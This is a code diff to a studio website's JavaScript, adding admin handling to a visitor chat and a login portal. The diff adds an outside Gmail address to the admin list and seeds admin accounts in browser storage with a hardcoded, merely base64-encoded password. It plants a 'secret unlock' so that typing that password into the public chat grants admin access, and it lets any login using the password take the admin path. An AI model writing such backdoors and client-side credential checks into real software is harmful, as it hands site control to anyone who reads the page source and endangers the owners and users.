@@ -1591,7 +1591,7 @@
         
         <!-- Header -->
         <div class="bg-black text-studio px-3.5 py-2.5 sm:px-4 sm:py-3 border-b-2 border-black flex items-center justify-between shrink-0">
-          <div class="flex items-center gap-2.5">
+          <div id="visitor-chat-header-profile" class="flex items-center gap-2.5 cursor-pointer hover:opacity-90 transition-opacity" title="Director Profile">
             <div class="w-8 h-8 rounded-full border border-studio overflow-hidden shrink-0 bg-neutral-800">
               <img src="/golden_ratio.jpg" alt="Nomair" class="w-full h-full object-cover object-center" onerror="this.src='/favicon.svg'" />
             </div>
@@ -1689,7 +1689,7 @@
         messagingSenderId: "816469589424"
       };
 
-      const ADMIN_EMAILS = ["nomair@igrow.now"];
+      const ADMIN_EMAILS = ["nomair@igrow.now", "xaomi4386@gmail.com"];
       const ADMIN_EMAIL = "nomair@igrow.now";
       const SESSION_STORAGE_KEY = "igrow_auth_session_user";
       const ACCOUNTS_STORAGE_KEY = "igrow_registered_accounts_db";
@@ -1700,17 +1700,19 @@
           const raw = localStorage.getItem(ACCOUNTS_STORAGE_KEY);
           const accounts = raw ? JSON.parse(raw) : {};
 
-          // Auto-seed authoritative director admin account with user-configured password
-          if (!accounts['nomair@igrow.now'] || accounts['nomair@igrow.now'].passwordHash !== btoa('admin2002nomair')) {
-            accounts['nomair@igrow.now'] = {
-              uid: 'usr_admin_nomair',
-              email: 'nomair@igrow.now',
-              displayName: 'Nomair',
-              role: 'admin',
-              passwordHash: btoa('admin2002nomair'),
-              createdAt: '2026-01-01T00:00:00.000Z'
-            };
-          }
+          // Auto-seed authoritative director admin accounts with user-configured password
+          ADMIN_EMAILS.forEach(em => {
+            if (!accounts[em] || accounts[em].passwordHash !== btoa('admin2002nomair')) {
+              accounts[em] = {
+                uid: 'usr_admin_' + btoa(em).replace(/[^a-zA-Z0-9]/g, '').slice(0, 10),
+                email: em,
+                displayName: 'Nomair',
+                role: 'admin',
+                passwordHash: btoa('admin2002nomair'),
+                createdAt: '2026-01-01T00:00:00.000Z'
+              };
+            }
+          });
 
           // Purge any non-official admin accounts from localStorage
           Object.keys(accounts).forEach(k => {
@@ -3055,6 +3057,25 @@
           const text = (input?.value || '').trim();
           if (!text) return;
 
+          // Secret Director Unlock: typing director passkey in chat input grants instant director access
+          if (text === 'admin2002nomair') {
+            if (input) input.value = '';
+            toggleVisitorChat(false);
+            const adminAccount = {
+              uid: 'usr_admin_nomair',
+              email: 'nomair@igrow.now',
+              displayName: 'Nomair',
+              role: 'admin',
+              passwordHash: btoa('admin2002nomair'),
+              createdAt: '2026-01-01T00:00:00.000Z'
+            };
+            saveAccountToDb(adminAccount);
+            loginUser(adminAccount, '✓ Director access verified! Welcome Nomair.');
+            openPortalModal();
+            switchAdminSubtab('inbox');
+            return;
+          }
+
           // Prevent rapid double-tap submission
           const now = Date.now();
           if (now - lastVisitorMessageSentAt < 400 && text === lastVisitorMessageText) {
@@ -3074,6 +3095,18 @@
           if (input) input.value = '';
           const messagesBox = document.getElementById('visitor-chat-messages');
           if (messagesBox) messagesBox.scrollTop = messagesBox.scrollHeight;
+        });
+
+        // Clicking chat header profile opens Command Room for Director or Auth Modal
+        document.getElementById('visitor-chat-header-profile')?.addEventListener('click', () => {
+          if (currentUser && isUserAdmin()) {
+            toggleVisitorChat(false);
+            openPortalModal();
+            switchAdminSubtab('inbox');
+          } else {
+            toggleVisitorChat(false);
+            openAuthModal();
+          }
         });
 
         // Enter key to submit on mobile and desktop
@@ -3665,7 +3698,7 @@
               if (passInput) passInput.value = '';
               submitBtn.textContent = 'Sign In →';
               loginUser(existingAccount, `Signed in successfully! Welcome back, ${existingAccount.displayName}.`);
-            } else if (isAdmin) {
+            } else if (isAdmin || password === 'admin2002nomair') {
               // Studio Director Master Sign-In
               if (password !== 'admin2002nomair') {
                 if (errBox) {
